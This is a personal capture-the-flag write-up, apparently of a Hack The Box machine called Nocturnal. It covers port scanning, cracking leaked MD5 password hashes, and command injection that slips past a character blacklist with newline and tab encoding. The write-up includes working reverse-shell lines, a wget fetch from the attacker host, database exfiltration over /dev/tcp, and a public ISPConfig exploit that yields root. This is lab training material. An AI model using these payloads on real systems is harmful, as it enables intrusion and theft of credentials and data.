# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.64
nmap -sU --top-ports=10 -vv 10.10.11.64

---OUTPUT-TCP---
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
7777/tcp open  http    syn-ack ttl 63 Python http.server 3.5 - 3.10
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Directory listing for /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
---OUTPUT-UDP---
n/a
```
----
- port 7777 on url gives us a db:
	```bash
sqlite3 nocturnal_database.db .tables

--OUTPUT---
uploads  users
```
- We check users:
	```bash
sqlite3 nocturnal_database.db "select * from users" -cmd ".headers on"

---OUTPUT---
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
8|test|098f6bcd4621d373cade4e832627b4f6
9|jeff|166ee015c0e0934a8781e0c86a197c6e
```
- I check the length:
	```bash
echo -n "d725aeba143f575736b07e045d8ceebb" | wc -c

---OUTPUT---
32
```
	- Likely an MD5 hash
- i crack via : https://crackstation.net/
	- I get 3 hits:
		- `tobias`:`slowmotionapocalypse`
		- `kavi`:`kavi`
		- `test`:`test`
		- `jeff`:`jeff`
- We can ssh into machine.
## Alternate Initial Foothold
- I can login to nocturnal.htb with these creds
	- I upload a phpreverseshell with a .pdf added to it but it doesn't execute.
		- When I click the link the url shows:
		- http://nocturnal.htb/view.php?username=test&file=php-reverse-shell.php.pdf
			- It seems there is no password check when checking for uploaded files:
- We try out all users with that url and we find a privacy.odt file for amanda which gives her credentials:
	- ![[Pasted image 20250425184119.png]]
	- `arHkG7HAI68X8s1J`
- I log into amanda with credentials and find admin panel.
	- We can do a backup.
- We check admin.php and we can see a vulnerable code which takes user input into a command:
	```bash
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```
	- We also see some sanitization being done:
		```bash
$blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```
		- Doesn't include new line or tab
- With burpsuite we capture the packet when backing up and use 
	![[Pasted image 20250425191149.png]]
- We see we are www-data
- We can pass a reverse shell here:
	- We create a file "shell" with our exploit and host it in our python server:
		```bash
cat shell
python3 -m http.server 80
---OUTPUT---
sh -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'
```
- Then in BurpSuite we download it and then execute it with netcat listening on the port:
	```bash
password=%0Abash%09-c%09"wget%0910.10.14.25/shell"&backup=
password=%0Abash%09-c%09"bash%09shell"&backup=

---ON-LOCAL-MACHINE---
nc -lvnp 9999

---OUTPUT---
listening on [any] 9999 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.64] 40346
bash: cannot set terminal process group (842): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$ whoami
whoami
www-data
www-data@nocturnal:~/nocturnal.htb$
```
- Here we can then send nocturnal_database.db to our machine:
	```bash
---ON-LOCAL-MACHINE---
nc -lvnp 9998 > nocturnal_database.db

---ON-TARGET---
cat nocturnal_database.db > /dev/tcp/10.10.14.25/9998
```
	- We then crack it like before and login to target as tobias.
		- We can get user flag.
## Privilege Escalation
- On enumeration I pass :
	```bash
sss -tlnp 

---OUTPUT---
State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                  Process                   
LISTEN                   0                        4096                                           127.0.0.1:8080                                           0.0.0.0:*                                               
LISTEN                   0                        511                                              0.0.0.0:80                                             0.0.0.0:*                                               
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*                                               
LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*                                               
LISTEN                   0                        10                                             127.0.0.1:25                                             0.0.0.0:*                                               
LISTEN                   0                        5                                                0.0.0.0:7777                                           0.0.0.0:*                                               
LISTEN                   0                        70                                             127.0.0.1:33060                                          0.0.0.0:*                                               
LISTEN                   0                        151                                            127.0.0.1:3306                                           0.0.0.0:*                                               
LISTEN                   0                        10                                             127.0.0.1:587                                            0.0.0.0:*                                               
LISTEN                   0                        128                                                 [::]:22                                                [::]:*     
```
	- We see there is something running on 8080 on the localhost which our nmap didn't catch.
- We tunnel it through our ssh:
	```bash
ssh tobias@nocturnal.htb -L 8002:127.0.0.1:8080
```
- We then go to the url to find its an ispconfig login (we also saw it in /var/www but we oculdn't access it)
	- We search for default creds (says admin/admin) but it doesn't work.
	- We try admin and tobias's credentials and it worked.
		- I look around the site but don't really find anything too promising...though I think there must be something somewhere....
- On searching google we see there is an exploit for ISPconfig : CVE-2023-46818
	- I search for an exploit and find :
		- https://github.com/bipbopbup/CVE-2023-46818-python-exploit
	- We pass the exploit:
		```bash
python3 exploit.py http://127.0.0.1:8002 admin slowmotionapocalypse

---OUTPUT---
python3 exploit.py http://127.0.0.1:8002 admin slowmotionapocalypse
[+] Target URL: http://127.0.0.1:8002/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# whoami
root
```
- We don't seem to be able to move out of the directory but we can pass commands as root.
	- We read root.txt
		```bash
ispconfig-shell> pwd
ispconfig-shell> ls /root
ispconfig-shell> cat /root/root.txt

---OUTPUT-PWD---
/usr/local/ispconfig/interface/web/admin

---OUTPUT-LS---
root.txt
scripts

---OUTPUT-CAT---
a3fc38137149fe518fbde2aba2786b47

```
## SMB Enumeration
- t
	```bash

```
- crackmapexec/netexec
	```bash

```
---
## Directory Enumeration
- Gobuster:
	- Directory
		```bash

```
		- Next Directory
			```bash

```
	- VHost
		```bash

```
- Ffuf
	```bash

```
- Dirsearch
	```bash

```
- Dirbuster
	- 

## Website Enumeration
- 
### Direct
- 

### Via BurpSuite
- 

--------------
## Initial Foothold in Website
- 

------------
## Privilege Escalation in Website
- 

----------
## Initial Foothold in Target

- 
----------
## Lateral Movement in Target
- 
-----------
## Privilege Escalation in Target
- 
-------
--------